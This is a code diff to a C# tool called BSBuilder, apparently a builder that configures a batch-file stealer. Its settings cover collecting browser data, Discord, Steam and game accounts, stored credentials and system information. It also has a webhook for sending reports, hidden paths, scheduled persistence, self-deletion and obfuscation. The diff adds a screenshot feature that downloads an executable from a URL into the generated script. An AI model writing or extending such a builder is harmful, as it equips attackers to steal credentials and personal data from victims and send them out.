@@ -33,6 +33,7 @@ namespace BSBuilder
         bool quser = Properties.Settings.Default.quser;
         bool cmdkey = Properties.Settings.Default.cmdkey;
         bool ipconfig = Properties.Settings.Default.ipconfig;
+        bool screenshot = Properties.Settings.Default.screenshot;
         bool chrome = Properties.Settings.Default.chrome;
         bool opera = Properties.Settings.Default.opera;
         bool vivaldi = Properties.Settings.Default.vivaldi;
@@ -51,6 +52,7 @@ namespace BSBuilder
         string webhook = Properties.Settings.Default.webhook;
         string reportstartmsg = Properties.Settings.Default.reportstartmsg;
         string reportendmsg = Properties.Settings.Default.reportendmsg;
+        string screenshottoolurl = Properties.Settings.Default.screenshottoolurl;
         string hidepath = Properties.Settings.Default.hidepath;
         string whenscheduled = Properties.Settings.Default.whenscheduled;
         string schedulename = Properties.Settings.Default.schedulename;
@@ -67,7 +69,7 @@ namespace BSBuilder
         {
             InitializeComponent();
 
-            this.Size = new Size(500, 679);
+            this.Size = new Size(500, 761);
 
             acceptTOScheckbox.Checked = Properties.Settings.Default.acceptTOS;
             startadmincheckbox.Checked = Properties.Settings.Default.startadmin;
@@ -77,6 +79,7 @@ namespace BSBuilder
             qusercheckbox.Checked = Properties.Settings.Default.quser;
             cmdkeycheckbox.Checked = Properties.Settings.Default.cmdkey;
             ipconfigcheckbox.Checked = Properties.Settings.Default.ipconfig;
+            screenshotcheckbox.Checked = Properties.Settings.Default.screenshot;
             chromecheckbox.Checked = Properties.Settings.Default.chrome;
             operacheckbox.Checked = Properties.Settings.Default.opera;
             vivaldicheckbox.Checked = Properties.Settings.Default.vivaldi;
@@ -96,6 +99,7 @@ namespace BSBuilder
             reportstartmsgtextbox.Text = Properties.Settings.Default.reportstartmsg;
             reportendmsgtextbox.Text = Properties.Settings.Default.reportendmsg;
             hidepathtextbox.Text = Properties.Settings.Default.hidepath;
+            sstooltextbox.Text = Properties.Settings.Default.screenshottoolurl;
             whenscheduledtextbox.Text = Properties.Settings.Default.whenscheduled;
             schedulenametextbox.Text = Properties.Settings.Default.schedulename;
             batchcopynametextbox.Text = Properties.Settings.Default.batchcopyname;
@@ -106,6 +110,8 @@ namespace BSBuilder
 
             fetchurl.Text = Properties.Settings.Default.fetchurl;
             batchlocationtextbox.Text = Properties.Settings.Default.batchlocation;
+
+            ssgroupbox.Enabled = screenshot;
 
             fetchbatch();
         }
@@ -230,7 +236,6 @@ namespace BSBuilder
             if (forcerestart)
             {
                 Application.Restart();
-                Environment.Exit(0);
             }
             else
             {
@@ -238,8 +243,16 @@ namespace BSBuilder
                 {
                     if (acceptTOS)
                         removeGOTO("goto remove_this_if_you_agree_to_follow_the_TOS");
+
+                    if (screenshot)
+                    {
+                        removeGOTO("goto skipscreenshot");
+
+                        if (screenshottoolurl.Length != 0)
+                            editVAR("set \"ssurl=https://github.com/chuntaro/screenshot-cmd/blob/master/screenshot.exe?raw=true\"", "ssurl", screenshottoolurl);
+                    }
                     else if (optimize)
-                        removeFUNCTION("goto remove_this_if_you_agree_to_follow_the_TOS");
+                        removeFUNCTION("goto skipscreenshot");
 
                     if (startadmin)
                         removeGOTO("goto skipadministrator");
@@ -866,49 +879,6 @@ namespace BSBuilder
             }
         }
 
-        private void Form1_FormClosing(object sender, FormClosingEventArgs e)
-        {
-            Properties.Settings.Default.fetchurl = batchfetchURL;
-
-            Properties.Settings.Default.acceptTOS = acceptTOS;
-            Properties.Settings.Default.startadmin = startadmin;
-            Properties.Settings.Default.systeminfo = systeminfo;
-            Properties.Settings.Default.tasklist = tasklist;
-            Properties.Settings.Default.netuser = netuser;
-            Properties.Settings.Default.quser = quser;
-            Properties.Settings.Default.cmdkey = cmdkey;
-            Properties.Settings.Default.ipconfig = ipconfig;
-            Properties.Settings.Default.chrome = chrome;
-            Properties.Settings.Default.opera = opera;
-            Properties.Settings.Default.vivaldi = vivaldi;
-            Properties.Settings.Default.firefox = firefox;
-            Properties.Settings.Default.osu = osu;
-            Properties.Settings.Default.discord = discord;
-            Properties.Settings.Default.steam = steam;
-            Properties.Settings.Default.minecraft = minecraft;
-            Properties.Settings.Default.growtopia = growtopia;
-            Properties.Settings.Default.recurring = recurring;
-            Properties.Settings.Default.selfdelete = selfdelete;
-            Properties.Settings.Default.optimize = optimize;
-            Properties.Settings.Default.obfuscate = obfuscate;
-            Properties.Settings.Default.confuse = confuse;
-
-            Properties.Settings.Default.webhook = webhook;
-            Properties.Settings.Default.reportstartmsg = reportstartmsg;
-            Properties.Settings.Default.reportendmsg = reportendmsg;
-            Properties.Settings.Default.hidepath = hidepath;
-            Properties.Settings.Default.whenscheduled = whenscheduled;
-            Properties.Settings.Default.schedulename = schedulename;
-            Properties.Settings.Default.batchcopyname = batchcopyname;
-            Properties.Settings.Default.batchupdatername = batchupdatername;
-            Properties.Settings.Default.vbname = vbname;
-            Properties.Settings.Default.updateurl = updateurl;
-            Properties.Settings.Default.targetusername = targetusername;
-            Properties.Settings.Default.batchlocation = batchlocation;
-
-            Properties.Settings.Default.Save();
-        }
-
         private void panel1_MouseDown(object sender, MouseEventArgs e)
         {
             if (e.Button == MouseButtons.Left)
@@ -933,14 +903,14 @@ namespace BSBuilder
             if (iii)
             {
                 iii = false;
-                this.Size = new Size(500, 679);
+                this.Size = new Size(500, 761);
                 inspectorbutton.Text = ">";
 
             }
             else
             {
                 iii = true;
-                this.Size = new Size(1232, 679);
+                this.Size = new Size(1232, 761);
                 inspectorbutton.Text = "<";
             }
         }
@@ -965,6 +935,70 @@ namespace BSBuilder
             {
                 confuse = false;
             }
+        }
+
+        private void screenshotcheckbox_CheckedChanged(object sender, EventArgs e)
+        {
+            if (screenshotcheckbox.Checked)
+            {
+                screenshot = true;
+                ssgroupbox.Enabled = true;
+            }
+            else
+            {
+                screenshot = false;
+                ssgroupbox.Enabled = false;
+            }
+        }
+
+        private void sstooltextbox_TextChanged(object sender, EventArgs e)
+        {
+            screenshottoolurl = sstooltextbox.Text;
+        }
+
+        private void Form1_FormClosing(object sender, FormClosingEventArgs e)
+        {
+            Properties.Settings.Default.fetchurl = batchfetchURL;
+
+            Properties.Settings.Default.acceptTOS = acceptTOS;
+            Properties.Settings.Default.startadmin = startadmin;
+            Properties.Settings.Default.systeminfo = systeminfo;
+            Properties.Settings.Default.tasklist = tasklist;
+            Properties.Settings.Default.netuser = netuser;
+            Properties.Settings.Default.quser = quser;
+            Properties.Settings.Default.cmdkey = cmdkey;
+            Properties.Settings.Default.ipconfig = ipconfig;
+            Properties.Settings.Default.screenshot = screenshot;
+            Properties.Settings.Default.chrome = chrome;
+            Properties.Settings.Default.opera = opera;
+            Properties.Settings.Default.vivaldi = vivaldi;
+            Properties.Settings.Default.firefox = firefox;
+            Properties.Settings.Default.osu = osu;
+            Properties.Settings.Default.discord = discord;
+            Properties.Settings.Default.steam = steam;
+            Properties.Settings.Default.minecraft = minecraft;
+            Properties.Settings.Default.growtopia = growtopia;
+            Properties.Settings.Default.recurring = recurring;
+            Properties.Settings.Default.selfdelete = selfdelete;
+            Properties.Settings.Default.optimize = optimize;
+            Properties.Settings.Default.obfuscate = obfuscate;
+            Properties.Settings.Default.confuse = confuse;
+
+            Properties.Settings.Default.webhook = webhook;
+            Properties.Settings.Default.reportstartmsg = reportstartmsg;
+            Properties.Settings.Default.reportendmsg = reportendmsg;
+            Properties.Settings.Default.screenshottoolurl = screenshottoolurl;
+            Properties.Settings.Default.hidepath = hidepath;
+            Properties.Settings.Default.whenscheduled = whenscheduled;
+            Properties.Settings.Default.schedulename = schedulename;
+            Properties.Settings.Default.batchcopyname = batchcopyname;
+            Properties.Settings.Default.batchupdatername = batchupdatername;
+            Properties.Settings.Default.vbname = vbname;
+            Properties.Settings.Default.updateurl = updateurl;
+            Properties.Settings.Default.targetusername = targetusername;
+            Properties.Settings.Default.batchlocation = batchlocation;
+
+            Properties.Settings.Default.Save();
         }
     }
 }
